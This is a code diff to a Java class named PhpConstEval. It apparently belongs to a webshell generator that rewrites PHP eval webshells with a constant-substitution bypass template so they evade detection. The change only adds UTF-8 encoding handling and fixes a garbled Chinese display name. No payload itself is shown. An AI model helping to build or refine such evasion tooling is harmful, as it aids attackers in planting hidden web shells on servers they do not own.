@@ -20,7 +20,7 @@ import util.Log;
 import util.functions;
 
 @GenerateProcessor(
-        DisplayName = "PHP ȫ�汾���������ƹ���eval��",
+        DisplayName = "PHP 全版本常量解密绕过（eval）",
         superTemplate = {"php"}
 )
 public class PhpConstEval implements ShellProcessor {
@@ -69,7 +69,7 @@ public class PhpConstEval implements ShellProcessor {
     public static String BypassReplace(String data, String pass) {
         try {
             InputStream inputStream = Generate.class.getResourceAsStream("template/templatebypass2.bin");
-            String code = new String(functions.readInputStream(inputStream));
+            String code = new String(functions.readInputStream(inputStream), StandardCharsets.UTF_8);
             inputStream.close();
             data = data.substring(5);
             Map<String, String> PhpConst = new HashMap<String, String>() {
@@ -113,16 +113,16 @@ public class PhpConstEval implements ShellProcessor {
         if (shell == null || shell.length == 0) {
             return shell == null ? new byte[0] : shell;
         }
-        String content = new String(shell);
+        String content = new String(shell, StandardCharsets.UTF_8);
         String pass = extractPass(content);
-        return BypassReplace(content, pass).getBytes();
+        return BypassReplace(content, pass).getBytes(StandardCharsets.UTF_8);
     }
 
     public byte[] doProcessor(byte[] shell, String suffix, String pass) {
         if (shell == null || shell.length == 0) {
             return shell == null ? new byte[0] : shell;
         }
-        return BypassReplace(new String(shell), pass == null ? "" : pass).getBytes();
+        return BypassReplace(new String(shell, StandardCharsets.UTF_8), pass == null ? "" : pass).getBytes(StandardCharsets.UTF_8);
     }
 
     /** 从已替换 {pass} 的 PHP 模板中提取密码。 */
